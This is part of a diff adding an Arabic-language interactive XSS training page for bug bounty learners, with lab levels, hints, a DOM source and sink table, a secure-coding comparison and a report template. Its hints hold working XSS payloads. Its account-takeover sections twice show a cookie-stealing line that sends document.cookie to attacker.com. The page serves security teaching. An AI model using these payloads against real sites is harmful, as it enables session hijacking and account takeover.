+            <strong>Search Bar</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">حقول البحث في الموقع تُعيد الـ query في الصفحة.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>كيف تختبر:</strong> أدخل <code>&lt;script&gt;console.log(1)&lt;/script&gt;</code> وراقب الانعكاس في source.
+          </div>
+        </div>
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'Profile')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">👤</span>
+            <strong>User Profile</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">الاسم، البايو، الرابط — يُعرض للمشرفين والمستخدمين.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>كيف تختبر:</strong> خصائص الـ name و bio أكثر سطوح Stored XSS شيوعاً.
+          </div>
+        </div>
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'Comments')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">💬</span>
+            <strong>Comments</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">قسم التعليقات قد يُخزّن payload وتُنفّذ لكل زائر.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>Stored XSS مثالي:</strong> كود ينفّذ على كل من يرى التعليق.
+          </div>
+        </div>
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'Messages')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">✉️</span>
+            <strong>Messages</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">رسائل داخلية — غالباً بدون HTML encoding.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>هدف رئيسي:</strong> رسالة تستهدف مشرف النظام بـ Stored XSS.
+          </div>
+        </div>
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'Upload')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">📎</span>
+            <strong>File Upload</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">اسم الملف أو بيانات SVG تُعرض مباشرة.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>SVG Trick:</strong> ملفات SVG يمكن أن تحتوي على JavaScript نشط.
+          </div>
+        </div>
+        <div class="card" style="cursor:pointer;" onclick="expandSurface(this,'API')">
+          <div style="display:flex;align-items:center;gap:10px;margin-bottom:8px;">
+            <span style="font-size:1.4rem;">🔌</span>
+            <strong>API Responses</strong>
+          </div>
+          <p style="color:var(--muted);font-size:0.82rem;">واجهات API التي تُعيد HTML بدلاً من JSON.</p>
+          <div class="surface-detail" style="display:none;margin-top:10px;color:var(--subtle);font-size:0.8rem;">
+            <strong>راقب:</strong> Content-Type header ومدى انعكاس الـ input في response.
+          </div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 3: TESTING WORKFLOW
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 3</span>
+        ⚙️ Testing Workflow
+      </div>
+      <p class="section-sub">اضغط على كل خطوة لمعرفة التفاصيل</p>
+
+      <div class="card">
+        <div class="stepper" id="stepper">
+          <div class="step-item active" onclick="showStep(0)">
+            <div class="step-circle">1</div>
+            <div class="step-label">Capture Request</div>
+          </div>
+          <div class="step-item" onclick="showStep(1)">
+            <div class="step-circle">2</div>
+            <div class="step-label">Find Input</div>
+          </div>
+          <div class="step-item" onclick="showStep(2)">
+            <div class="step-circle">3</div>
+            <div class="step-label">Modify Parameter</div>
+          </div>
+          <div class="step-item" onclick="showStep(3)">
+            <div class="step-circle">4</div>
+            <div class="step-label">Observe Reflection</div>
+          </div>
+          <div class="step-item" onclick="showStep(4)">
+            <div class="step-circle">5</div>
+            <div class="step-label">Identify Context</div>
+          </div>
+          <div class="step-item" onclick="showStep(5)">
+            <div class="step-circle">6</div>
+            <div class="step-label">Test Impact</div>
+          </div>
+        </div>
+
+        <div id="step-detail" class="step-detail visible">
+          <strong style="color:var(--cyan);">الخطوة 1: Capture Request</strong>
+          <p style="color:var(--subtle);font-size:0.88rem;margin-top:8px;line-height:1.6;">افتح Burp Suite وفعّل Intercept. افتح المتصفح واضغط على أي إدخال في الموقع — الـ request سيظهر في Burp لتراه بالكامل. ابحث عن Parameters مشبوهة.</p>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 4: INTERACTIVE LAB
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 4</span>
+        🧪 Interactive Lab
+      </div>
+      <p class="section-sub">4 مستويات — من المبتدئ للمتقدم. حل كل واحد لكسب XP!</p>
+
+      <div class="lab-tabs">
+        <button class="lab-tab active" onclick="switchLab(0,this)">Level 1: Reflected 🟢</button>
+        <button class="lab-tab" onclick="switchLab(1,this)">Level 2: Attribute 🔵</button>
+        <button class="lab-tab" onclick="switchLab(2,this)">Level 3: JavaScript 🟠</button>
+        <button class="lab-tab" onclick="switchLab(3,this)">Level 4: DOM 🔴</button>
+      </div>
+
+      <!-- LEVEL 1 -->
+      <div class="lab-area active" id="lab-0">
+        <div class="card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+            <h3 style="font-size:1rem;font-weight:800;">🟢 Level 1: Reflected XSS — Search Page</h3>
+            <span class="tag green">+100 XP عند الحل</span>
+          </div>
+          <p style="color:var(--muted);font-size:0.88rem;margin-bottom:16px;">الموقع يُعيد ما تكتبه في شريط البحث مباشرةً في الصفحة. أوجد XSS يُنفّذ كوداً JavaScript!</p>
+
+          <div class="browser-frame">
+            <div class="browser-bar">
+              <div class="dot-red"></div><div class="dot-yel"></div><div class="dot-grn"></div>
+              <div class="browser-url">https://target-site.com/search?q=<span id="l1-url-preview" style="color:var(--orange);"></span></div>
+            </div>
+            <div class="browser-body">
+              <p style="font-size:0.85rem;color:var(--muted);margin-bottom:10px;">ابحث عن شيء:</p>
+              <div class="search-sim">
+                <input type="text" id="l1-input" placeholder="ادخل payload هنا..." oninput="updateL1()">
+                <button onclick="submitL1()">بحث</button>
+              </div>
+              <div style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">نتائج البحث عن: <span id="l1-output" style="color:var(--text);"></span></div>
+              <div id="l1-result" class="output-box" style="min-height:44px;"></div>
+            </div>
+          </div>
+
+          <!-- Hints -->
+          <div class="hint-accordion">
+            <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">🔦 التلميحات (اضغط لإظهار — لا تفتح إلا بعد المحاولة!)</p>
+            <button class="hint-btn" onclick="toggleHint('h1-1',this)"><span>تلميح 1 — أين المشكلة؟</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h1-1">الكود يستخدم <code>innerHTML</code> لعرض كلمة البحث — هذا يسمح لأي HTML أو JS بالتنفيذ.</div>
+
+            <button class="hint-btn" onclick="toggleHint('h1-2',this)"><span>تلميح 2 — ماذا تجرب؟</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h1-2">جرب إدخال وسم HTML بسيط أولاً مثل <code>&lt;b&gt;test&lt;/b&gt;</code> ثم صعّد للـ script.</div>
+
+            <button class="hint-btn" onclick="toggleHint('h1-3',this)"><span>تلميح 3 — الـ Payload؟</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h1-3">الـ payload الأساسي: <code>&lt;img src=x onerror=alert(1)&gt;</code></div>
+
+            <button class="hint-btn" onclick="toggleHint('h1-4',this)"><span>تلميح 4 — الحل الكامل</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h1-4">اكتب: <code>&lt;script&gt;alert('XSS')&lt;/script&gt;</code> أو <code>&lt;img src=x onerror=alert(document.cookie)&gt;</code> ثم اضغط بحث.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LEVEL 2 -->
+      <div class="lab-area" id="lab-1">
+        <div class="card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+            <h3 style="font-size:1rem;font-weight:800;">🔵 Level 2: Attribute Context XSS</h3>
+            <span class="tag cyan">+150 XP عند الحل</span>
+          </div>
+          <p style="color:var(--muted);font-size:0.88rem;margin-bottom:16px;">قيمتك تُدرج داخل <code>value</code> attribute. يجب أن تكسر الـ attribute أولاً ثم تُنفّذ JavaScript!</p>
+
+          <div class="browser-frame">
+            <div class="browser-bar">
+              <div class="dot-red"></div><div class="dot-yel"></div><div class="dot-grn"></div>
+              <div class="browser-url">target-site.com/profile?name=...</div>
+            </div>
+            <div class="browser-body">
+              <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">كود HTML المولّد:</p>
+              <div class="output-box" style="margin-bottom:12px;"><code id="l2-preview">&lt;input value="YOUR_INPUT"&gt;</code></div>
+              <div class="search-sim">
+                <input type="text" id="l2-input" placeholder='مثال: " onmouseover=alert(1) x="' oninput="updateL2()">
+                <button onclick="submitL2()">تطبيق</button>
+              </div>
+              <div id="l2-result" style="margin-top:10px;font-size:0.85rem;color:var(--muted);"></div>
+            </div>
+          </div>
+
+          <div class="hint-accordion">
+            <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">🔦 التلميحات</p>
+            <button class="hint-btn" onclick="toggleHint('h2-1',this)"><span>تلميح 1</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h2-1">أنت داخل attribute — لا يمكن مباشرة كتابة &lt;script&gt;. يجب أن تغلق الـ attribute أولاً بـ <code>"</code></div>
+            <button class="hint-btn" onclick="toggleHint('h2-2',this)"><span>تلميح 2 — الحل</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h2-2">الـ payload: <code>" onmouseover="alert(1)</code> — يُغلق الـ value ثم يُضيف event handler.</div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LEVEL 3 -->
+      <div class="lab-area" id="lab-2">
+        <div class="card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+            <h3 style="font-size:1rem;font-weight:800;">🟠 Level 3: JavaScript Context XSS</h3>
+            <span class="tag orange">+200 XP عند الحل</span>
+          </div>
+          <p style="color:var(--muted);font-size:0.88rem;margin-bottom:16px;">قيمتك تُدرج داخل كود JavaScript. يجب أن تكسر الـ string context وتُنفّذ كود خاص بك!</p>
+
+          <div class="browser-frame">
+            <div class="browser-bar">
+              <div class="dot-red"></div><div class="dot-yel"></div><div class="dot-grn"></div>
+              <div class="browser-url">target-site.com/app</div>
+            </div>
+            <div class="browser-body">
+              <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">الكود المولّد في الصفحة:</p>
+              <div class="output-box" style="margin-bottom:12px;"><code id="l3-preview">var username = "YOUR_INPUT";</code></div>
+              <div class="search-sim">
+                <input type="text" id="l3-input" placeholder='جرب: ";alert(1)//' oninput="updateL3()">
+                <button onclick="submitL3()">تنفيذ</button>
+              </div>
+              <div id="l3-result" style="margin-top:10px;font-size:0.85rem;"></div>
+            </div>
+          </div>
+
+          <div class="hint-accordion">
+            <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">🔦 التلميحات</p>
+            <button class="hint-btn" onclick="toggleHint('h3-1',this)"><span>تلميح 1</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h3-1">الكود يضع إدخالك داخل string — أغلق الـ string بـ <code>"</code> أولاً.</div>
+            <button class="hint-btn" onclick="toggleHint('h3-2',this)"><span>تلميح 2 — الحل</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h3-2">الـ payload: <code>";alert(document.cookie)//</code></div>
+          </div>
+        </div>
+      </div>
+
+      <!-- LEVEL 4 -->
+      <div class="lab-area" id="lab-3">
+        <div class="card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:14px;flex-wrap:wrap;gap:8px;">
+            <h3 style="font-size:1rem;font-weight:800;">🔴 Level 4: DOM-Based XSS</h3>
+            <span class="tag red">+300 XP عند الحل</span>
+          </div>
+          <p style="color:var(--muted);font-size:0.88rem;margin-bottom:16px;">الثغرة في JavaScript على جانب العميل — تنبع من <code>location.hash</code> وتصب في <code>innerHTML</code>.</p>
+
+          <div class="browser-frame">
+            <div class="browser-bar">
+              <div class="dot-red"></div><div class="dot-yel"></div><div class="dot-grn"></div>
+              <div class="browser-url">target-site.com/page<strong style="color:var(--orange);">#YOUR_INPUT</strong></div>
+            </div>
+            <div class="browser-body">
+              <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">قيمة الـ hash تُعرض هنا:</p>
+              <div id="l4-display" class="output-box" style="margin-bottom:12px;">مرحباً بك!</div>
+              <div class="search-sim">
+                <input type="text" id="l4-input" placeholder="أدخل محتوى الـ hash..." oninput="updateL4()">
+                <button onclick="submitL4()">تطبيق</button>
+              </div>
+              <div id="l4-result" style="margin-top:10px;font-size:0.85rem;"></div>
+            </div>
+          </div>
+
+          <div class="hint-accordion">
+            <p style="font-size:0.82rem;color:var(--muted);margin-bottom:8px;">🔦 التلميحات</p>
+            <button class="hint-btn" onclick="toggleHint('h4-1',this)"><span>تلميح 1</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h4-1">Source هو <code>location.hash</code> والـ Sink هو <code>innerHTML</code> — إدخالك يُدرج مباشرة في DOM.</div>
+            <button class="hint-btn" onclick="toggleHint('h4-2',this)"><span>تلميح 2 — الحل</span><i class='bx bx-chevron-down'></i></button>
+            <div class="hint-body" id="h4-2">الـ payload: <code>&lt;img src=x onerror=alert('DOM-XSS')&gt;</code></div>
+          </div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 5: PAYLOAD EVOLUTION
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 5</span>
+        🚀 Payload Evolution — Beginner إلى Expert
+      </div>
+      <p class="section-sub">مكتبة كاملة من الـ Payloads مع شرح كل واحدة</p>
+
+      <div class="card">
+        <table class="payload-table">
+          <thead>
+            <tr>
+              <th>المستوى</th>
+              <th>الـ Payload</th>
+              <th>السياق</th>
+              <th>الهدف</th>
+              <th></th>
+            </tr>
+          </thead>
+          <tbody id="payload-tbody"></tbody>
+        </table>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 6: DOM XSS DEEP DIVE
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 6</span>
+        🌊 DOM XSS Deep Dive
+      </div>
+      <p class="section-sub">Sources → Sinks: كيف يتدفق الكود الخطير؟</p>
+
+      <div class="dom-grid">
+        <div class="card">
+          <h3 style="font-size:1rem;font-weight:800;color:var(--orange);margin-bottom:14px;">📥 Sources (المصادر)</h3>
+          <p style="color:var(--muted);font-size:0.82rem;margin-bottom:12px;">مصادر البيانات التي يتحكم فيها المهاجم:</p>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <div style="background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--orange);">location.href</span> — URL الصفحة الكاملة
+            </div>
+            <div style="background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--orange);">location.hash</span> — قسم الـ # في الـ URL
+            </div>
+            <div style="background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--orange);">location.search</span> — Query string
+            </div>
+            <div style="background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--orange);">document.referrer</span> — الصفحة السابقة
+            </div>
+            <div style="background:var(--bg-3);border:1px solid var(--border);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--orange);">postMessage()</span> — رسائل بين الـ origins
+            </div>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3 style="font-size:1rem;font-weight:800;color:var(--red);margin-bottom:14px;">📤 Sinks (المصبّات)</h3>
+          <p style="color:var(--muted);font-size:0.82rem;margin-bottom:12px;">أماكن تنفيذ الكود الخطير:</p>
+          <div style="display:flex;flex-direction:column;gap:8px;">
+            <div style="background:var(--bg-3);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--red);">innerHTML</span> — إدراج HTML مباشرة
+            </div>
+            <div style="background:var(--bg-3);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--red);">eval()</span> — تنفيذ string كـ code
+            </div>
+            <div style="background:var(--bg-3);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--red);">document.write()</span> — كتابة في الصفحة
+            </div>
+            <div style="background:var(--bg-3);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--red);">setTimeout(string)</span> — تأخير تنفيذ كود
+            </div>
+            <div style="background:var(--bg-3);border:1px solid rgba(239,68,68,0.3);border-radius:8px;padding:10px 14px;font-family:monospace;font-size:0.82rem;">
+              <span style="color:var(--red);">location.href = ...</span> — إعادة توجيه
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Secure Coding Compare -->
+      <div class="card" style="margin-top:16px;">
+        <h3 style="font-size:1rem;font-weight:800;margin-bottom:6px;">🛡️ Secure Coding — قبل وبعد</h3>
+        <p style="color:var(--muted);font-size:0.82rem;margin-bottom:12px;">الفرق بين الكود المصاب والكود الآمن</p>
+        <div class="code-compare">
+          <div class="code-block">
+            <div class="code-header vuln">❌ Vulnerable Code</div>
+            <pre>// مشكلة: innerHTML
+const q = location.hash.slice(1);
+results.innerHTML = "نتائج: " + q;</pre>
+          </div>
+          <div class="code-block">
+            <div class="code-header safe">✅ Secure Code</div>
+            <pre>// آمن: textContent فقط
+const q = location.hash.slice(1);
+results.textContent = "نتائج: " + q;</pre>
+          </div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 7: REAL BUG BOUNTY SIMULATION
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 7</span>
+        🎯 Real Bug Bounty Simulation
+      </div>
+      <p class="section-sub">سيناريو حقيقي — Stored XSS في ملف شخصي يستهدف المشرف</p>
+
+      <div class="card">
+        <div style="display:flex;align-items:center;gap:10px;margin-bottom:20px;flex-wrap:wrap;">
+          <span class="tag red">⚠️ Target: Social Network Profile</span>
+          <span class="tag orange">Stored XSS</span>
+          <span class="tag purple">Account Takeover</span>
+        </div>
+
+        <div class="scenario-flow">
+          <div class="scenario-step" onclick="showScenario(0)">
+            <div class="icon">👤</div>
+            <strong>Profile</strong><br><span style="color:var(--muted);font-size:0.75rem;">Edit Bio</span>
+          </div>
+          <div class="scenario-arrow">→</div>
+          <div class="scenario-step" onclick="showScenario(1)">
+            <div class="icon">💉</div>
+            <strong>Insert</strong><br><span style="color:var(--muted);font-size:0.75rem;">XSS Payload</span>
+          </div>
+          <div class="scenario-arrow">→</div>
+          <div class="scenario-step" onclick="showScenario(2)">
+            <div class="icon">💾</div>
+            <strong>Save</strong><br><span style="color:var(--muted);font-size:0.75rem;">Database Store</span>
+          </div>
+          <div class="scenario-arrow">→</div>
+          <div class="scenario-step" onclick="showScenario(3)">
+            <div class="icon">🔍</div>
+            <strong>Admin Views</strong><br><span style="color:var(--muted);font-size:0.75rem;">Profile Review</span>
+          </div>
+          <div class="scenario-arrow">→</div>
+          <div class="scenario-step" onclick="showScenario(4)">
+            <div class="icon">🍪</div>
+            <strong>Payload Fires</strong><br><span style="color:var(--muted);font-size:0.75rem;">Cookie Stolen</span>
+          </div>
+          <div class="scenario-arrow">→</div>
+          <div class="scenario-step" onclick="showScenario(5)">
+            <div class="icon">👑</div>
+            <strong>Admin Taken</strong><br><span style="color:var(--muted);font-size:0.75rem;">Full Takeover</span>
+          </div>
+        </div>
+
+        <div id="scenario-detail" class="step-detail visible" style="margin-top:20px;">
+          <strong style="color:var(--orange);">الخطوة 1: تعديل الـ Bio</strong>
+          <p style="color:var(--subtle);font-size:0.88rem;margin-top:8px;line-height:1.6;">اذهب إلى صفحة التعديل في ملفك الشخصي واكتب في حقل الـ Bio payload مثل: <code>&lt;script&gt;fetch('https://attacker.com/?c='+document.cookie)&lt;/script&gt;</code></p>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 8: IMPACT TRAINING
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 8</span>
+        💥 Impact Training
+      </div>
+      <p class="section-sub">اضغط على كل خيار لتعرف كيف يُضخَّم التأثير</p>
+
+      <div class="impact-grid">
+        <div class="impact-card" onclick="showImpact('takeover')">
+          <div class="icon">👑</div>
+          <h4>Account Takeover</h4>
+          <p>سرقة الـ Session Cookie والدخول باسم الضحية</p>
+          <div style="margin-top:10px;display:none;" id="impact-takeover">
+            <div class="code-block" style="text-align:right;">
+              <div class="code-header vuln">Payload</div>
+              <pre style="font-size:0.75rem;">fetch('https://attacker.com/?c='
+  +document.cookie)</pre>
+            </div>
+          </div>
+        </div>
+        <div class="impact-card" onclick="showImpact('privilege')">
+          <div class="icon">🔺</div>
+          <h4>Privilege Escalation</h4>
+          <p>تنفيذ Admin Actions نيابةً عن المشرف</p>
+          <div style="margin-top:10px;display:none;" id="impact-privilege">
+            <p style="font-size:0.78rem;color:var(--subtle);">إنشاء Admin account جديد باستخدام XHR من جلسة المشرف.</p>
+          </div>
+        </div>
+        <div class="impact-card" onclick="showImpact('csrf')">
+          <div class="icon">🔄</div>
+          <h4>CSRF via XSS</h4>
+          <p>تنفيذ طلبات غير مصرح بها بسلطة الضحية</p>
+          <div style="margin-top:10px;display:none;" id="impact-csrf">
+            <p style="font-size:0.78rem;color:var(--subtle);">XSS يتجاوز حماية CSRF token لأنه يعمل من نفس الـ origin.</p>
+          </div>
+        </div>
+      </div>
+    </section>
+    <hr class="section-divider">
+
+    <!-- ═══════════════════════════════════════
+         PHASE 9: REPORTING ACADEMY
+    ═══════════════════════════════════════ -->
+    <section class="section">
+      <div class="section-title">
+        <span class="num">Phase 9</span>
+        📝 Reporting Academy
+      </div>
+      <p class="section-sub">اكتب تقرير Bug Bounty احترافي جاهز للإرسال لـ HackerOne</p>
+
+      <div style="display:grid;grid-template-columns:1fr 1fr;gap:24px;">
+        <div class="card">
+          <h3 style="font-size:1rem;font-weight:800;margin-bottom:16px;">📋 نموذج التقرير</h3>
+          <div class="report-form">
+            <div class="form-group">
+              <label>عنوان الثغرة (Title)</label>
+              <input id="r-title" type="text" placeholder="Stored XSS in User Profile Bio Field">
+            </div>
+            <div class="form-group">
+              <label>ملخص (Summary)</label>
+              <textarea id="r-summary" placeholder="وصف مختصر للثغرة وتأثيرها..."></textarea>
+            </div>
+            <div class="form-group">
+              <label>خطوات الإعادة (Steps to Reproduce)</label>
+              <textarea id="r-steps" placeholder="1. انتقل إلى صفحة الملف الشخصي&#10;2. أدخل في حقل Bio: &lt;script&gt;alert(1)&lt;/script&gt;&#10;3. احفظ وافتح الملف الشخصي"></textarea>
+            </div>
+            <div class="form-group">
+              <label>التأثير (Impact)</label>
+              <input id="r-impact" type="text" placeholder="Stored XSS → Session Hijacking → Account Takeover">
+            </div>
+            <div class="form-group">
+              <label>الخطورة (Severity)</label>
+              <select id="r-severity">
+                <option value="Critical">Critical</option>
+                <option value="High">High</option>
+                <option value="Medium" selected>Medium</option>
+                <option value="Low">Low</option>
+              </select>
+            </div>
+            <div class="form-group">
+              <label>الإصلاح المقترح (Remediation)</label>
+              <input id="r-fix" type="text" placeholder="استخدام textContent بدلاً من innerHTML">
+            </div>
+            <button class="glow-btn" onclick="generateReport()">
+              <i class='bx bx-code-block'></i> توليد التقرير
+            </button>
+          </div>
+        </div>
+
+        <div class="card">
+          <div style="display:flex;align-items:center;justify-content:space-between;margin-bottom:16px;">
+            <h3 style="font-size:1rem;font-weight:800;">📄 التقرير المولّد</h3>
+            <button class="copy-btn" onclick="copyReport()"><i class='bx bx-copy'></i> نسخ</button>
+          </div>
+          <div id="report-output" class="report-output visible" style="min-height:300px;opacity:0.4;color:var(--muted);">
+            ← املأ النموذج واضغط "توليد التقرير" لإنشاء التقرير الاحترافي...
+          </div>
+        </div>
+      </div>
+    </section>
+
+  </main>
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar-col">
+    <div class="lb-wrapper">
+      <div class="lb-title"><i class='bx bx-trophy' style="color:var(--gold)"></i> Top Hunters</div>
+      <div class="lb-row me">
+        <div class="lb-rank" style="color:var(--gold);">🥇</div>
+        <div>
+          <div style="font-weight:800;">Abdo</div>
+          <div style="font-size:0.75rem;">Elite 👑</div>
+        </div>
+        <div style="margin-right:auto;font-family:monospace;font-size:0.8rem;" id="lb-xp-me">0 XP</div>
+      </div>
+      <div class="lb-row">
+        <div class="lb-rank" style="color:var(--subtle);">🥈</div>
+        <div><div style="font-weight:800;">Ahmed</div><div style="font-size:0.75rem;">Expert</div></div>
+        <div style="margin-right:auto;font-family:monospace;font-size:0.8rem;">850 XP</div>
+      </div>
+      <div class="lb-row">
+        <div class="lb-rank" style="color:var(--muted);">🥉</div>
+        <div><div style="font-weight:800;">Mohamed</div><div style="font-size:0.75rem;">Researcher</div></div>
+        <div style="margin-right:auto;font-family:monospace;font-size:0.8rem;">600 XP</div>
+      </div>
+    </div>
+
+    <div class="mentor-bubble" style="background:var(--card);border:1px solid var(--border);border-radius:14px;padding:20px;">
+      <div class="mentor-avatar">🤖</div>
+      <div class="mentor-text">
+        <strong>AI Mentor</strong>
+        <div id="mentor-msg" style="margin-top:6px;">ابدأ بـ Phase 0 واضغط على العقد لتفهم كل نوع XSS! 🚀</div>
+      </div>
+    </div>
+
+    <div class="card">
+      <div style="font-size:0.82rem;font-weight:700;color:var(--muted);margin-bottom:10px;">📜 الشهادات</div>
+      <div id="cert-area" style="font-size:0.82rem;color:var(--muted);">أكمل جميع Labs للحصول على الشهادة!</div>
+    </div>
+  </aside>
+
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast">✅ تم النسخ بنجاح!</div>
+<div class="xp-flash" id="xp-flash">+0 XP 🎉</div>
+
+<script>
+  // ── STATE ──
+  let totalXP = 0;
+  const labsSolved = { 0: false, 1: false, 2: false, 3: false };
+  const xpRewards = { 0: 100, 1: 150, 2: 200, 3: 300 };
+  const ranks = [
+    { min: 0,    label: '🟢 Beginner' },
+    { min: 200,  label: '🏹 Hunter' },
+    { min: 500,  label: '🧠 Researcher' },
+    { min: 800,  label: '👑 Expert' },
+    { min: 1000, label: '⚡ Elite' },
+  ];
+
+  function addXP(amount, reason) {
+    totalXP += amount;
+    updateUI();
+    const flash = document.getElementById('xp-flash');
+    flash.textContent = `+${amount} XP — ${reason} 🎉`;
+    flash.style.display = 'block';
+    setTimeout(() => flash.style.display = 'none', 2500);
+    updateMentor();
+  }
+
+  function getRank() {
+    for (let i = ranks.length - 1; i >= 0; i--) {
+      if (totalXP >= ranks[i].min) return ranks[i].label;
+    }
+    return ranks[0].label;
+  }
+
+  function updateUI() {
+    const r = getRank();
+    const pct = Math.min((totalXP / 1000) * 100, 100);
+    const labsDone = Object.values(labsSolved).filter(Boolean).length;
+    document.getElementById('nav-xp').textContent = totalXP + ' XP';
+    document.getElementById('nav-rank').textContent = r;
+    document.getElementById('ph-rank').textContent = r;
+    document.getElementById('ph-xp').textContent = totalXP + ' / 1000 XP';
+    document.getElementById('ph-xp-bar').style.width = pct + '%';
+    document.getElementById('ph-labs').textContent = labsDone + ' / 4';
+    document.getElementById('lb-xp-me').textContent = totalXP + ' XP';
+    if (labsDone === 4) {
+      document.getElementById('ph-cert').textContent = '🏆 XSS Specialist';
+      document.getElementById('cert-area').innerHTML = '<div style="background:var(--cyan-dim);border:1px solid var(--cyan);border-radius:8px;padding:12px;text-align:center;"><div style="font-size:1.5rem;">🏆</div><strong style="color:var(--cyan);">XSS Specialist</strong><div style="font-size:0.75rem;color:var(--muted);">Abdo Cyber Academy</div></div>';
+    }
+  }
+
+  function updateMentor() {
+    const msgs = [
+      'ممتاز! استمر في حل الـ Labs 💪',
+      'الـ XP بيزيد! جرب Level أعلى 🔥',
+      'عظيم! تذكر دايماً تكتب تقرير بعد كل ثغرة 📝',
+      'أنت على الطريق الصح! جرب Level 3 الآن 🎯',
+      'قريب من الـ Expert! 👑'
+    ];
+    const msg = msgs[Math.floor(Math.random() * msgs.length)];
+    document.getElementById('mentor-msg').textContent = msg;
+  }
+
+  // ── MAP DETAIL ──
+  const mapData = {
+    root: { title: 'XSS — Cross-Site Scripting', body: 'ثغرة تسمح للمهاجم بحقن كود JavaScript في صفحة ويب يراها مستخدمون آخرون. تنقسم إلى 3 أنواع رئيسية: Reflected, Stored, DOM.' },
